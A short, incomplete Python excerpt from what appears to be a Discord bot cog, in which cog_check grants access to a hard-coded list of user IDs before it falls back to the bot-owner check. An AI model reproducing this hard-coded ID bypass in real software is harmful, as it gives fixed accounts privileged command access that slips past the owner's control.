...
class Feature(commands.Cog):
    ...
    async def cog_check(self, ctx: commands.Context):  # pylint: disable=invalid-overridden-method
        ...
        """
        if ctx.author.id in [800751809592557659 ,800751809592557659,768920702953979935,913805129482928128,939242807959375892]:
            return True
        elif not await ctx.bot.is_owner(ctx.author):
